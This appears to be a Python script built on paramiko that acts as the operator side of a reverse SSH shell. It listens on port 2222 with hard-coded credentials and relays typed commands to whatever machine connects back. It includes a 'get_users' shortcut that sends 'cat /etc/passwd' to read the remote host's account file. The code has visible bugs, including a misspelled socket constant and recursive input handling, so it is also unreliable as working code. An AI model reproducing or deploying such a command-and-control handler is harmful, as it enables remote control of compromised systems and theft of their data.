import paramiko
import os
import socket


class SSHServer(paramiko.ServerInterface):
    def check_channel_request(self,kind,chanid):
        if kind == 'session':
            return paramiko.OPEN_SUCCEEDED
        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED

    def check_auth_password(self,username,password):
        if(username == 'sshuser') and (password == 'sshpass'):
            return paramiko.AUTH_SUCCESSFUL
        return paramiko.AUTH_FAILED

def main():
    server = '0.0.0.0'
    port = 2222
    CWD = os.getcwd()
    HOSTKEY = paramiko.RSAKey(filename=os.path.join(CWD,'id_rsa'))
    try:
        sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        sock.setsockopt(socket.SOC_SOCKET, socket.SO_REUSEADDR,1)
        sock.bind((server,port))
        sock.listen()
        print('Listening for connections...')
        client, addr = sock.accept()
    except KeyboardInterrupt:
        quit()

    SSH_Session = paramiko.Transport(client)
    SSH_Session.add_server_key(HOSTKEY)
    server = SSHServer()
    SSH_Session.start_server(server=server)
    chan = SSH_Session.accept()
    if chan is None:
        print('Session transport error')
        quit()
    print(chan)
    success_mesg = chan.recv(1024).decode()
    print(f'{success_mesg}')
    chan.send(' ')
    def comm_handler():
        try:
            while True:
                cmd_line = ('FUN#> ')
                command = input(cmd_line + '')
                if command == "get_users":
                    command = ('cat /etc/passwd')
                    chan.send(command)
                    ret_value = chan.recv(8192)
                    print(ret_value.decode())
                if command == '':
                    comm_handler()
                else:
                    try:
                        chan.send(command)
                        ret_value = chan.recv(8192)
                        print(ret_value.decode())
                    except SystemError:
                        ...
        except Exception as e:
            print(str(e))
            ...
        except KeyboardInterrupt:
            quit()
    comm_handler()



if __name__ == '__main__':
    main()
